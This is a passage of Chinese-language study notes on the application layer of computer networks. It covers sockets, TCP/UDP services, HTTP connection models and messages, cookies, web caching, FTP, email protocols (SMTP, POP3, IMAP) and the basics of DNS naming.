title="C&#x2F;S和P2P体系结构的混合体"></a>C&#x2F;S和P2P体系结构的混合体</h3><p>Skype：</p><ul><li><p>文件（目录）查询：集中式</p><p>   存在一个中心服务器</p></li><li><p>文件分发（传输）：P2P</p><p>   客户端连接可以不通过服务器直接连接</p></li></ul><p>即时通讯（以QQ为例）：</p><ul><li>两个用户之间的聊天是P2P方式</li><li>当用户上线时，向中心服务器注册其IP地址</li><li>用户通过中心服务器找到好友IP地址</li></ul><h2 id="进程通信（Processes-communicating）"><a href="#进程通信（Processes-communicating）" class="headerlink" title="进程通信（Processes communicating）"></a>进程通信（Processes communicating）</h2><p><strong>进程：在主机上运行的应用程序</strong></p><p>进程间的通信：</p><ul><li><p>在同一个主机内：使用进程间通信机制通信（ 操作系统定义），无需协议。</p></li><li><p>在不同主机内：通过交换报文（Message）来通信。</p><ul><li>使用OS提供的通信服务</li><li>借助传输层提供的服务，按照应用协议交换报文</li></ul></li></ul><blockquote><pre><code>   客户端进程：发起通信的进程   服务器进程：等待连接的进程   注意：P2P架构的应用也有客户端进程和服务器进程之分</code></pre></blockquote><p>分布式进程通信需要解决的问题：</p><ul><li>问题1：进程标识（自身）和寻址（让对方找得到自己）问题。</li><li>问题2：传输层-应用层是如何提供通信服务。<ul><li>位置：层间界面的SAP（TCP&#x2F;IP ：socket）</li><li>形式：应用程序接口API（TCP&#x2F;IP ：socket API）</li></ul></li><li>问题3：：如何使用传输层提供的服务，实现应用进程间的报文交换，实现应用。<ul><li>定义应用层协议：报文格式，解释，时序等</li><li>编制程序，使用OS提供的API ，调用网络基础设施提供通信服务传报文，实现应用时序等；</li></ul></li></ul><ol><li>问题1：对进程进行编址：</li></ol><ul><li><p>进程为了接收报文，必须有一个标识，即：SAP（当然发送也需要标识）</p><pre><code>  主机IP：唯一的32位IP地址（仅仅有IP地址不能够唯一标示一个进程；在一台端系统上有很 多应用进程在运行）  所采用的传输层协议：TCP or UDP  端口号（Port Numbers）  一些知名端口号的例子：HTTP: TCP 80 Mail: TCP 25  TCP和UDP的端口号是不同的</code></pre></li><li><p>一个进程用IP地址和端口号（port）标识。</p></li><li><p>本质上，两个主机进程之间的通信是由2个端节点（end point）构成</p></li></ul><ol start="2"><li>问题2：传输层-应用层提供的服务：</li></ol><ul><li><p>层间接口必须要携带的信息（3类）</p><ul><li>要传输的报文（对于本层来说就是SDU）</li><li>谁传递的信息：本方应用进程的标识，即本方IP+TCP(UDP) 端口</li><li>信息要传递给谁：对方应用进程的标识，即对方IP+TCP(UDP) 端口</li></ul></li><li><p>传输层实体（tcp或者udp实体）根据这些信息进行TCP报文段（UDP报文段）的封装</p><ul><li>源端口号，目标端口号，数据等</li><li>将IP地址往下交IP实体，用于封装IP数据报：源IP,目标IP</li></ul></li></ul><h2 id="Socket（套接字）"><a href="#Socket（套接字）" class="headerlink" title="Socket（套接字）"></a>Socket（套接字）</h2><p><strong>进程通过套接字发送或接受报文。</strong></p><p>可以把套接字比作一道门。发送进程将报文推出门户，发送进程依赖于传输层设施在另外一侧的门将报文交付给接收进程，同样的，接收进程从另外一端的门户收到报文（依赖于传输层设施）</p><blockquote><p>   传输层提供的服务-层间信息的代表：</p><p>   层间建立连接后需要传输大量的信息，如果Socket API 每次传输报文，都携带如此多的信息，太繁琐易错，不便于管理。为了解决这个问题，出现了Socket（套接字，实际上就是用<strong>一个整数表示两个应用实体之间的通信关系</strong> ，是一个本地标识）。</p></blockquote><ul><li>TCP之上的套接字：</li></ul><pre><code>对于使用面向连接服务（TCP）的应用而言，套接字是4元组的一个具有本地意义的标识。    4元组：源IP，源port，目标IP，目标port    唯一的指定了一个会话（2个进程之间的会话关系）    应用使用这个标示，与远程的应用进程通信    不必在每一个报文的发送都要指定这4元组    简单，便于管理</code></pre><ul><li>UDP之上的套接字：</li></ul><pre><code>（由于UDP服务下的进程通信前不需要连接，前后报文都是独立传输的，且可能传输给不同的分布式进程。所以只能用一个整数表示本应用实体的标识。）对于使用无连接服务（UDP）的应用而言，套 接字是2元组的一个具有本地意义的标识。    2元组：源IP，源port    UDP套接字指定了应用所在的一个端节点（end point）    在发送数据报时，采用创建好的本地套接字（标识 ID），就不必在发送每个报文中指明自己所采用的 ip和port    但是在发送报文时，必须要指定对方的ip和udp port(另外一个端节点)</code></pre><ol start="3"><li><p>问题3：如何使用传输层提供的服务实现应用</p><p> 定义应用层协议：报文格式，解释，时序等<br> 编制程序，通过API调用网络基础设施提供通信 服务传报文，解析报文，实现应用时序等</p></li></ol><p>应用层协议：</p><p>该协议定义了：运行在不同端系统上的应用进程如何相互交换报文。（仅仅规范了两个进程在通信中需要遵守的规则）</p><ul><li><p>交换的报文类型：请求和应答报文</p></li><li><p>各种报文类型的语法：报文中的各个字段及其描述</p></li><li><p>字段的语义：即字段取值的含义</p></li><li><p>进程何时、如何发送报文及对报文进行响应的规则</p><blockquote><p>应用协议仅仅是应用的一个组成部分。一个应用还包括用户界面，本地I&#x2F;O操作，业务逻辑等</p></blockquote></li><li><p>公开协议：</p><ul><li><p>由RFC文档定义</p></li><li><p>允许互操作</p></li><li><p>举例：HTTP、SMTP</p></li></ul></li><li><p>私有协议（不公开）：例如：SKype、QQ、wechat</p></li></ul><p>应用需要传输层提供的服务：</p><ul><li>数据丢失率（Data loss）：</li></ul><pre><code>有些应用则要求100%的可靠数据传输（如文件），有些应用（如音频）能容忍 一定比例以下的数据丢失</code></pre><blockquote><pre><code>   实际上在看视频时是会有丢帧的情况，我们无法察觉的原因是因为采用了一些掩盖技术：   比如第二帧的画面丢失，可以选择重放第一帧或第三帧，也可以计算并播放第一、三帧求和后取均值。</code></pre></blockquote><ul><li><p>延迟（Timing）：</p><p>   一些应用出于有效性考虑，对数据传输有严格的时间限制（如：Internet 电话、交互式游戏）</p></li><li><p>吞吐（Throughput）</p><p>   一些应用（如多媒体应用）必须需要最小限度的吞吐，从而使得应用能够有效运转。一些应用能充分利用可供使用的吞吐(“弹性应用”)</p></li><li><p>安全性（Security）</p><p>   机密性、数据完整性、可认证性（鉴别）…</p></li></ul><blockquote><p>下表是一些常见应用对传输服务的要求：</p></blockquote><table><thead><tr><th>应用</th><th>数据丢失率</th><th>吞吐</th><th>时间敏感性</th></tr></thead><tbody><tr><td>文件传输</td><td>不能丢失</td><td>弹性</td><td>不</td></tr><tr><td>E-mail</td><td>不能丢失</td><td>弹性</td><td>不</td></tr><tr><td>Web 文档</td><td>不能丢失</td><td>弹性</td><td>不</td></tr><tr><td>实时音视频</td><td>容忍丢失</td><td>音频： 5kbps-1Mbps 视频：10kbps-5Mbps</td><td>是，100ms</td></tr><tr><td>存储音视频</td><td>容忍丢失</td><td>音频： 5kbps-1Mbps 视频：10kbps-5Mbps</td><td>是，几秒</td></tr><tr><td>交互式游戏</td><td>容忍丢失</td><td>几kbps ~10kbps</td><td>是，100ms</td></tr><tr><td>即时讯息</td><td>不能丢失</td><td>弹性</td><td>是和不是</td></tr></tbody></table><p>Internet传输层提供的服务：</p><ul><li><p>TCP服务：</p><ul><li>可靠的传输服务（不出错、不丢失、不乱序）</li><li>流量控制：发送方不会淹没接受方</li><li>拥塞控制：当网络出现拥塞时，能抑制发送方</li><li>不能提供的服务：延时保证、最小吞吐（带宽）保证和安全性</li><li>面向连接：要求在客户端进程和服务器进程之间建立连接</li></ul></li><li><p>UDP服务：</p><ul><li><p>不可靠数据传输</p></li><li><p>不提供的服务：可靠， 流量控制、拥塞控制、 延时、带宽保证、不建立连接</p></li></ul><blockquote><p>UDP存在的必要性：</p><ul><li><p>能够区分不同的进程，而IP服务不能。（在IP提供的主机到主机&#x2F;端到端功能的基础上，区分了主机的 应用进程）</p></li><li><p>无需建立连接：省去了建立连接时间，适合事务性的应用</p></li><li><p>不做可靠性的工作：例如检错重发，适合那些对实时性要求比较高而对正确性要求不高的应用。（实现可靠性是必须要付出时间代价的）</p></li><li><p>没有拥塞控制和流量控制：应用能够按照设定的速度发送数据。（在TCP上面的应用，应用发送数据的速度和主机向网络发送的实际速度是不一致的，因为有流量控制和拥塞控制）</p></li></ul></blockquote></li></ul><blockquote><p>下表展示了Internet应用及其应用层协议和传输协议</p></blockquote><table><thead><tr><th>应用</th><th>应用层协议</th><th>下层的传输协议</th></tr></thead><tbody><tr><td>E-mail</td><td>SMTP [RFC 2821]</td><td>TCP</td></tr><tr><td>远程终端访问</td><td>Telnet [RFC 854]</td><td>TCP</td></tr><tr><td>Web</td><td>HTTP [RFC 2616]</td><td>TCP</td></tr><tr><td>文件传输</td><td>FTP [RFC 959]</td><td>TCP</td></tr><tr><td>流媒体</td><td>专用协议 (如RealNetworks)</td><td>TCP 或 UDP</td></tr><tr><td>Internet电话</td><td>专用协议 (如Net2Phone)</td><td>TCP 或 UDP</td></tr></tbody></table><p>安全TCP</p><ul><li><p>TCP&amp;UDP</p><ul><li>都没有加密</li><li>明文通过互联网传输 ，甚至密码</li></ul></li><li><p>SSL</p><ul><li>在TCP上面实现，提供加密的TCP连接（https:&#x2F;&#x2F;）</li><li>私密性</li><li>数据完整性</li><li>端到端的鉴别&#x2F;认证</li></ul></li><li><p>SSL在应用层</p><ul><li>应用采用SSL库，SSL库使用TCP通信</li></ul></li><li><p>SSL socket API</p><ul><li>应用通过API将明文交给socket，SSL将其加密在互联网上传输</li></ul></li></ul><h2 id="Web-and-HTTP"><a href="#Web-and-HTTP" class="headerlink" title="Web and HTTP"></a>Web and HTTP</h2><p>一些术语：</p><ul><li><p>Web页：由一些对象组成。（对象可以是HTML文件、JPEG图像、Java小程序、声 音剪辑文件等）</p></li><li><p>Web页含有一个基本的HTML文件，该基本HTML文件又包含若干对象的引用（链接）</p></li><li><p>通过URL对每个对象进行引用</p><p>   包含访问协议，用户名，口令字，端口等；（如下图）</p></li></ul><blockquote><p>   一个网页通常是一个baseHTML文件，这个文件是HTML的形式，浏览器可以解析。其中包含各种对象，但是并不包括对象本身，而是这个对象的引用链接。（浏览器需要判断这个链接，并且去再次访问这个对象链接，从而将对象本身访问到并展示在baseHTML页面上）</p></blockquote><h3 id="HTTP（hypertext-transfer-protocol）：超文本传输协议"><a href="#HTTP（hypertext-transfer-protocol）：超文本传输协议" class="headerlink" title="HTTP（hypertext transfer protocol）：超文本传输协议"></a>HTTP（hypertext transfer protocol）：超文本传输协议</h3><ul><li><p>Web的应用层协议</p></li><li><p>客户&#x2F;服务器模式（C&#x2F;S）</p><p>   客户: 请求、接收和显示 Web对象的浏览器。</p><p>   服务器: 对请求进行响应， 发送对象的Web服务器。</p></li><li><p>使用TCP：</p><ul><li>客户发起一个与服务器的TCP连接 (建立套接字) ，端口号为80。</li></ul><blockquote><p>   服务器在最初建立之时会有一个socket（waiting socket）守候在80端口。如果一个浏览器（客户端）向服务器建立连接，此时又会有一个socket（connection socket）产生（代表该服务器与客户端的会话关系）。</p><p>   waiting socket比较特殊，作用就是等待其他浏览器（客户端）并发访问该服务器，而connection socket则表示会话关系，可以有多个。</p></blockquote><p>   服务器接受客户的TCP连接</p><p>   在浏览器(HTTP客户端)与 Web服务器(HTTP服务器server)交换HTTP报文(应用层协议报文)</p><p>   TCP连接关闭</p></li><li><p>HTTP是无状态的：服务器并不维护关于客户的任何信息（无状态的好处就是简单，不需要维护一些内容）</p><blockquote><p>无状态：客户端向服务器发送请求，服务器接收请求，并返回响应报文，断开连接，结束。（不知道该客户端之前有没有访问过，未来还会不会接着访问）</p></blockquote></li><li><p>非持久HTTP（Nonpersistent HTTP）连接</p><ul><li><p>最多只有一个对象在TCP连接上发送</p></li><li><p>下载多个对象需要多个TCP连接</p></li><li><p>HTTP&#x2F;1.0使用非持久连接</p></li></ul></li><li><p>持久HTTP（Persistent HTTP）连接</p><p>   多个对象可以在一个（在客户端和服务器之间的）TCP连接上传输</p><p>   HTTP&#x2F;1.1 默认使用持久连接</p></li></ul><h3 id="响应时间模型："><a href="#响应时间模型：" class="headerlink" title="响应时间模型："></a>响应时间模型：</h3><ul><li><p>RTT（往返时间，round-trip time）：一个小的分组从客户端到服务器，再回到客户端的时间（传输时间忽略）</p></li><li><p>响应时间：</p><ul><li>一个RTT用来发起TCP连接</li><li>一个 RTT用来HTTP请求并等待HTTP响应</li><li>文件传输时间</li></ul><blockquote><p>在非持久HTTP连接下请求一个文件（对象）的时间 &#x3D; 2RTT + 传输时间</p></blockquote></li></ul><p>非持久HTTP的缺点：</p><ul><li><p>请求每个对象需要2个 RTT</p></li><li><p>操作系统必须为每个TCP连接分配资源</p></li><li><p>浏览器通常打开并行TCP连接 ，以获取引用对象</p><blockquote><p>并行连接，即同时开启多个连接请求不同对象。</p><p>   1index.html + 10jpeg &#x3D; 2RTT（建立连接） + 2RTT（并行请求对象） &#x3D; 4RTT</p></blockquote></li></ul><p>持久HTTP（Persistent HTTP）连接：</p><ul><li><p>服务器在发送响应后，仍保持TCP连接</p></li><li><p>在相同客户端和服务器之间的后续请求和响应报文通过相同的连接进行传送</p></li><li><p>客户端在遇到一个引用对象的时候，就可以尽快发送该对象的请求</p></li><li><p>非流水方式的持久HTTP（Persistent without pipelining）：</p><ul><li><p>客户端只能在收到前一个响应后才能发出新的请求</p></li><li><p>每个引用对象需要一个RTT</p></li></ul><blockquote><p>   1index.html + 10jpeg &#x3D; 2RTT（建立连接） + 10×1RTT（10jpeg） &#x3D; 12RTT</p></blockquote></li><li><p>流水方式的持久HTTP（Persistent with pipelining）：</p><ul><li><p>HTTP&#x2F;1.1的默认模式</p></li><li><p>客户端遇到一个引用对象就立即产生一个请求</p></li><li><p>所有引用（小）对象基本上只用一个RTT时间就能满足</p><blockquote><p>1index.html + 10jpeg &#x3D; 2RTT（建立连接） + 1RTT（10jpeg） &#x3D; 3RTT</p></blockquote></li></ul></li></ul><h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><p>有两种类型的HTTP报文：<strong>request</strong>（请求报文）、<strong>response</strong>（响应报文）。</p><ul><li><p>HTTP请求报文：</p><p>   请求报文的通用格式如下图：</p><blockquote><p>   提交表单有两种方式：</p><ul><li>Post方式：<ul><li>网页通常包括表单输入</li><li>输入的数据放在实体(entity body )部分上传到服务器</li></ul></li><li>URL方式：<ul><li>方法：GET方法</li><li>输入的数据放在URL中上传</li></ul></li></ul></blockquote><blockquote><p>  方法类型：<br>   HTTP&#x2F;1.0<br>       GET<br>           POST<br>           HEAD（要求服务器在响应报文中不包含请求对象→维护或者建立索引时引用）<br>       HTTP&#x2F;1.1<br>           GET, POST, HEAD<br>           PUT（将实体中的文件上载到URL字段规定的路径→通常做网页内容的维护）<br>           DELETE（删除URL字段规定的文件）</p></blockquote></li><li><p>HTTP响应报文：</p><blockquote><p>HTTP响应状态码：</p><ul><li>200 OK：请求成功，请求对象包含在响应报文的后续部分。</li><li>301 Moved Permanently：请求的对象已经被永久转移了；新的URL在响应报文的Location: 首部行中指定。客户端软件自动用新的URL去获取对象。</li><li>400 Bad Request：一个通用的差错代码，表示该请求不能被服务器解读。</li><li>404 Not Found：请求的文档在该服务上没有找到。</li><li>505 HTTP Version Not Supported</li></ul></blockquote></li></ul><h2 id="用户-服务器状态：cookies"><a href="#用户-服务器状态：cookies" class="headerlink" title="用户-服务器状态：cookies"></a>用户-服务器状态：cookies</h2><blockquote><p>   大多数主要的门户网站使用 cookies</p></blockquote><p>cookies有4个组成部分：</p><ul><li><p>在HTTP响应报文中有一个cookie的首部行</p></li><li><p>在HTTP请求报文含有一个cookie的首部行</p></li><li><p>在用户端系统中保留有一个cookie文件，由用户的浏览器管理</p></li><li><p>在Web站点有一个后端数据库</p><blockquote><p>   客户端（浏览器）在第一次向服务器发送请求时不携带cookie，服务器也会判断，这是第一次访问，并会在响应报文中设置一个cookie，客户端收到响应报文后会将服务器发送来的cookie存到本地，下一次再访问该服务器时就会携带上该cookie值，此时服务器就可以凭借cookie值去判断、分析客户端的状态。</p><p>通过cookie，可以将HTTP从一个无状态的协议转换为一个有状态的协议。</p></blockquote></li></ul><p>cookies可以带来以下内容：</p><ul><li>authorization 授权（用户验证）</li><li>shopping carts 购物车</li><li>recommendations 推荐</li><li>user session state (Web e-mail) 用户会话状态</li></ul><blockquote><p>   如何维护状态：</p><pre><code>协议端节点：在多个事务上 ，发送端和接收端维持状态（不会保留在中间节点中）   http报文携带状态信息</code></pre></blockquote><p>cookies的副作用：</p><ul><li>Cookies允许站点知道许多关于用户的信息（隐私）</li><li>网站记录用户信息并分析用户行为（可能将它知道的东西卖给第三方）</li><li>使用重定向和cookie的搜索引擎还能知道用户更多的信息（姓名、电话、邮箱等）</li></ul><h2 id="Web-caches（proxy-server）缓存（代理服务器）"><a href="#Web-caches（proxy-server）缓存（代理服务器）" class="headerlink" title="Web caches（proxy server）缓存（代理服务器）"></a>Web caches（proxy server）缓存（代理服务器）</h2><p>目标：不访问原始服务器，就可以满足客户的请求。</p><p>缓存既是客户端又是服务器。</p><p>通常缓存是由ISP安装 (大学、公司、居民区ISP)</p><blockquote><p>   浏览器将所有的HTTP请求发给缓存（代理服务器）</p><ul><li>在缓存中的对象：缓存直接返回对象</li><li>如对象不在缓存，缓存请求原始服务器，然后再将对象返回给客户端</li></ul><p>   优势：</p><ul><li>降低客户端的请求响应时间</li><li>可以大大减少一个机构内部网络与Internent接入链路上的流量</li><li>互联网大量采用了缓存： 可以使较弱的ICP也能够有效提供内容（快速分发内容）</li></ul></blockquote><p>条件GET方法</p><blockquote><p>   使用缓存有一个风险：客户端访问到的缓存中的数据，在原始服务器中已修改，结果就是拿到旧数据。</p><p>   为此HTTP协议做了一个升级：Conditional GET（条件GET）</p></blockquote><p>目标：如果缓存器中的对象拷贝是最新的，就不要发送对象</p><blockquote><ul><li>缓存器: 在HTTP请求中指定缓存拷贝的日期</li></ul><pre><code>   If-modified-since:&lt;date’&gt;</code></pre><ul><li><p>服务器:</p><pre><code>  - 如果缓存拷贝没有改变，则响应报文不包含对象: HTTP/1.0 304 Not Modified  - 如果缓存拷贝改变，则返回数据：HTTP/1.0 200 OK &lt;data’&gt;</code></pre></li></ul></blockquote><h2 id="Short-URL"><a href="#Short-URL" class="headerlink" title="Short URL"></a>Short URL</h2><p>把普通网址，转换成比较短的网址。（比如：<a href="http://t.cn/RlB2PdD%EF%BC%89">http://t.cn/RlB2PdD）</a></p><ul><li>微博；这些限制字数的应用里都用到这种技术。</li><li>百度短网址：<a href="http://dwz.cn/">http://dwz.cn/</a></li><li>google短网址： <a href="https://goo.gl/">https://goo.gl/</a></li></ul><p>当我们在浏览器里输入 <a href="http://t.cn/RlB2PdD">http://t.cn/RlB2PdD</a> 时会经历以下步骤：</p><ol><li><p>浏览器解析DNS，获取域名对应的IP；</p></li><li><p>当获取到IP时，会往这个IP地址发送http的get请求以获取到RlB2PdD对应的长链接地址；</p></li><li><p>HTTP通过301转到对应的长链接URL；</p></li></ol><blockquote><pre><code>   注意：这里为什么使用301？   301是永久性转移（重定向）。也就是说，这个短地址一经生成就不会发生变化了。</code></pre></blockquote><h2 id="FTP（文件传输协议）"><a href="#FTP（文件传输协议）" class="headerlink" title="FTP（文件传输协议）"></a>FTP（文件传输协议）</h2><ul><li><p>向远程主机上传输文件或从远程主机接收文件</p></li><li><p>建立在TCP基础之上</p></li><li><p>客户&#x2F;服务器模式：<br>   客户端：发起传输的一方<br>   服务器：远程主机</p></li><li><p>ftp: RFC 959</p></li><li><p>ftp服务器：端口号为21</p></li></ul><blockquote><pre><code>   FTP客户端与FTP服务器通过端口21联系，并使用TCP为传输协议   客户端通过控制连接获得身份确认（通过TCP）（用户名和口令，全部都为明文）   客户端通过控制连接发送命令浏览远程目录（可以上传、下载）   收到一个文件传输命令时，服务器打开一个到客户端的TCP数据传输连接（客户端的20号端口，由服务器主动建立），控制信息/指令和数据传输的连接是不一样的。   一个文件传输完成后，服务器关闭连接   服务器打开第二个TCP数据连接用来传输另一个文件   控制连接： 带外（ “out of band” ）传送（只能建立一个）   数据连接：带内传送（可以建立多个）   FTP服务器维护用户的状态信息： 当前路径、用户帐户与控制连接对应（FTP是一个有状态的协议）</code></pre></blockquote><p>FTP在控制连接上以ASCII文本方式传送：</p><blockquote><p>   命令样例：</p><pre><code>   USER username   PASS password   LIST：请服务器返回远程主机当前目录的文件列表   RETR filename（重复性下载文件）：从远程主机的当前目录检索文件 (gets)   STOR filename（上载文件）：向远程主机的当前目录存放文件 (puts)</code></pre><p>   返回码样例：（状态码和状态信息 (同HTTP)）</p><pre><code>   331 Username OK, password required   125 data connection already open; transfer starting   425 Can’t open data connection   452 Error writing file</code></pre></blockquote><h2 id="Electronic-mail（Email）"><a href="#Electronic-mail（Email）" class="headerlink" title="Electronic mail（Email）"></a>Electronic mail（Email）</h2><p>电子邮件（Email）的三个主要组成部分</p><ul><li><p>user agents （用户代理）</p><pre><code>   又名 “邮件阅读器”   撰写、编辑和阅读邮件   如Outlook、Foxmail   输出和输入邮件保存在服务器上</code></pre></li><li><pre><code>mail servers（邮件服务器）</code></pre></li></ul><blockquote><pre><code>       邮箱中管理和维护发送给用户的邮件       输出报文队列保持待发送邮件报文       邮件服务器之间的SMTP协议：发送email报文           客户：发送方邮件服务器           服务器：接收端邮件服务器   两个作用：       用户代理配置好邮件服务器的IP地址、端口号，然后用户代理把邮件发送给邮件服务器的队列当中。邮件服务器会把队列中的邮件依次发送到目标邮件服务器中。       （用户代理发邮件到邮件服务器用的是SMTP协议）       然后目标邮件服务器接收到邮件后会把邮件放到相应用户的目录（邮箱）当中。收件人运行客户代理，从邮件服务器中相应的自己的邮箱中把信件拉回到本地。       （邮件服务器发给目标邮件服务器使用的是SMTP协议）       （“拉”邮件的协议有三种：POP3、IMAP、HTTP）</code></pre></blockquote><h2 id="simple-mail-transfer-protocol-SMTP（简单邮件传输协议）"><a href="#simple-mail-transfer-protocol-SMTP（简单邮件传输协议）" class="headerlink" title="simple mail transfer protocol: SMTP（简单邮件传输协议）"></a>simple mail transfer protocol: SMTP（简单邮件传输协议）</h2><blockquote><pre><code>   使用TCP在客户端和服务器之间传送报文，端口号为25   直接传输：从发送方服务器到接收方服务器   传输的3个阶段：       握手       传输报文       关闭   命令/响应交互：       命令：ASCII文本       响应：状态码和状态信息   报文必须为7位ASCII码（邮件的内容必须是7位ASCII码的范围，超过是不允许传输的）</code></pre></blockquote><p>邮件发送举例如下图：</p><p>说明：</p><ol><li><p>Alice使用用户代理撰写邮件并发送给<a href="mailto:&#98;&#111;&#98;&#64;&#x73;&#x6f;&#x6d;&#101;&#x73;&#99;&#104;&#x6f;&#x6f;&#108;&#x2e;&#x65;&#100;&#x75;">&#98;&#111;&#98;&#64;&#x73;&#x6f;&#x6d;&#101;&#x73;&#99;&#104;&#x6f;&#x6f;&#108;&#x2e;&#x65;&#100;&#x75;</a></p></li><li><p>Alice的用户代理将邮件发送到她的邮件服务器；邮件放在报文队列中（SMTP）</p></li><li><p>SMTP的客户端打开到Bob邮件服务器的TCP连接</p></li><li><p>SMTP客户端通过TCP连接发送Alice的邮件（SMTP）</p></li><li><p>Bob的邮件服务器将邮件放到Bob的邮箱</p></li><li><p>Bob调用他的用户代理阅读邮件（POP3、IMAP、HTTP）</p></li></ol><blockquote><ul><li>邮件服务器会周期性扫描队列，隔一段时间将收集的邮件全部发出。（如果每时每刻都处于“待命”状态是很耗能的）</li><li>可能导致邮件发送失败的原因：<ul><li>网络连接有问题</li><li>接收方的邮件服务器地址填写错误</li><li>垃圾邮件过滤</li></ul></li><li>如果邮件发送失败，会将该邮件发送给另外一个失败的队列中，隔一段时间后重新发送，若仍失败，则退回该邮件。</li></ul></blockquote><h3 id="SMTP-vs-HTTP"><a href="#SMTP-vs-HTTP" class="headerlink" title="SMTP vs HTTP"></a>SMTP vs HTTP</h3><p><strong>SMTP</strong></p><ul><li><pre><code>   SMTP：推（push）</code></pre></li><li><pre><code>   SMTP使用持久连接</code></pre></li><li><pre><code>   SMTP要求报文（首部和主体）为7位ASCII编码</code></pre></li><li><pre><code>   SMTP服务器使用 CRLF.CRLF决定报文的尾部</code></pre></li><li><pre><code>   SMTP：多个对象包含在一个报文中</code></pre></li></ul><p><strong>HTTP</strong></p><ul><li><pre><code>   HTTP：拉（pull）</code></pre></li><li><pre><code>   二者都是ASCII形式的命令/响应交互、状态码</code></pre></li><li><pre><code>   HTTP：每个对象封装在各自的响应报文中</code></pre></li></ul><h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><ul><li><p>SMTP：交换email报文的协议</p></li><li><p>RFC 822: 文本报文的标准：</p><ul><li><p>首部行：如</p><pre><code>To:From:Subject:与SMTP命令不同 ！</code></pre></li></ul></li><li><p>主体：</p><ul><li>报文，只能是ASCII码字符</li></ul></li><li><p>问题：如果传输的内容包含中文字符，都不在ASCII范围之内。就要对其进行编码（扩展）：</p></li><li><p>MIME：多媒体邮件扩展（multimedia mail extension）,RFC 2045, 2056</p></li><li><p>在报文首部用额外的行申明MIME内容类型</p></li><li><p>内部的编码采用base64编码格式</p><blockquote><p>使用bsae64，将不在ASCII范围之内的内容进行长扩展，使得其在ASCII范围之内。（大小写英文字母，加号，等号）</p></blockquote></li></ul><h3 id="邮件访问协议"><a href="#邮件访问协议" class="headerlink" title="邮件访问协议"></a>邮件访问协议</h3><ul><li>SMTP: 传送到接收方的邮件服务器</li><li>邮件访问协议：从服务器访问邮件（“拉”）<ul><li>POP：邮局访问协议（Post Office Protocol）[RFC 1939]<ul><li>用户身份确认 (代理&lt;–&gt;服务器) 并下载</li></ul></li><li>IMAP：Internet邮件访问协议（Internet Mail Access Protocol）[RFC 1730]<ul><li>相比POP3更多特性 (更复杂，如：远程目录维护；仅仅只下载邮件正文，附件可选择下载，对手机端友好)</li><li>直接在邮件服务器上处理存储的报文</li></ul></li><li>HTTP：Hotmail , Yahoo! Mail等<br>  方便</li></ul></li></ul><p>POP3协议</p><ul><li><pre><code>   有邮件“download and delete”（下载并删除）模式</code></pre></li><li><pre><code>   有邮件“Download-and-keep”（下载并保留）模式（不同的客户机都可以拷贝邮件）</code></pre></li></ul><ul><li><pre><code>   POP3在会话中是无状态的（不支持远程目录维护）</code></pre></li></ul><p>IMAP协议</p><ul><li>IMAP服务器将每个报文与一个文件夹联系起来</li><li>允许用户用目录来组织报文</li><li>允许用户读取报文组件</li><li>IMAP在会话过程中保留用户状态：目录名、报文ID与目录名之间映射</li></ul><h2 id="DNS-Domain-Name-System"><a href="#DNS-Domain-Name-System" class="headerlink" title="DNS(Domain Name System)"></a>DNS(Domain Name System)</h2><p>域名解析系统是一个给其他“应用”应用的应用。（提供域名到IP地址的转换）</p><p>DNS的必要性：</p><p>先明白IP地址的作用：一个是标识，一个是寻址。网络设备都是按照IP地址来工作的，但是这有一个问题，IP地址都是数字（IPv4：4Byte，32bit；IPv6：16Byte，128bit），人很难记忆。人类还是更倾向于使用有意义的字符串来标识Internet上的设备。所以域名解析系统就应运而生：它提供域名到IP地址的转换。</p><p>接下来我们要考虑的是DNS如何实现这一功能，即我们需要考虑以下问题：</p><ul><li><p>问题一：如何命名设备？</p><pre><code>   用有意义的字符串：好记，便于人类用使用   解决一个平面命名的重名问题：层次化命名</code></pre></li><li><p>问题二：如何完成名字到IP地址的转换？</p><p>   分布式的数据库维护和响应名字查询（仅由单一设备去维护上亿数量的用户设备的域名解析是不可能的）</p></li><li><p>问题三：如何维护：增加或者删除一个域，需要在域名系统中做哪些工作？</p></li></ul><h3 id="DNS总体思路和目标"><a href="#DNS总体思路和目标" class="headerlink" title="DNS总体思路和目标"></a>DNS总体思路和目标</h3><ul><li><p>主要思路：</p><ul><li>分层的、基于域的命名机制</li><li>若干分布式的数据库完成名字到IP地址的转换</li><li>运行在UDP之上端口号为53的应用服务</li><li>核心的Internet功能，但在端系统（边缘）中的应用层实现</li></ul></li><li><p>主要目标：</p><ul><li><p>实现主机名-IP地址的转换(name&#x2F;IP translate)</p></li><li><p>其他目的：</p><ul><li><p>主机别名-规范名字的转换：Host aliasing</p><blockquote><p>规范名字便于管理，主机别名便于访问</p></blockquote></li><li><p>邮件服务器别名-邮件服务器的正规名字的转换：Mail server aliasing</p></li><li><p>负载均衡：Load Distribution</p></li></ul></li></ul></li></ul><h3 id="DNS名字空间"><a href="#DNS名字空间" class="headerlink" title="DNS名字空间"></a>DNS名字空间</h3><p>DNS域名结构</p><p>一个层面命名设备会有很多重名，因而DNS采用层次树状结构的命名方法：</p><ul><li><p>Internet根被划为几百个顶级域(top lever domains，TLD)</p><ul><li><p>通用的(generic)：</p><pre><code>   .com; .edu ; .gov ; .int ; .mil ; .net ; .org; .firm ; .hsop ; .web ; .arts ; .rec ;</code></pre></li><li><p>国家的(countries)：</p><pre><code>   .cn ; .us ; .nl ; .jp</code></pre></li></ul></li><li><p>每个(子)域下面可划分为若干子域(subdomains)</p></li><li><p>树叶是主机</p></li></ul><p>全世界一共有13个根域名服务器（中国没有）</p><p>域名（Domain Name）</p><ul><li>从本域往上，直到树根（根域名）。中间使用“.”间隔不同的级别<ul><li>域的域名：可以用于表示一个域</li><li>主机的域名：一个域上的一个主机</li></ul></li></ul><p>域名的管理</p><ul><li>一个域管理其下的子域（例如：.cn 被划分为 edu.cn ；com.cn ）</li><li>创建一个新的域，必须征得它所属域的同意</li></ul><p>域与物理网络无关</p><ul><li><p>域遵从组织界限，而不是物理网络</p></li><li><pre><code>   一个域的主机可以不在一个网络</code></pre></li><li><pre><code>   一个网络的主机不一定在一个域</code></pre><blockquote><p>例如：我在中国的某间教室运行一台主机，而这台主机域名由欧洲的某个服务器维护。</p></blockquote></li><li><p>域的划分是逻辑的，而不是物理的</p></li></ul><p>域名-IP地址的转换</p><blockquote><p>   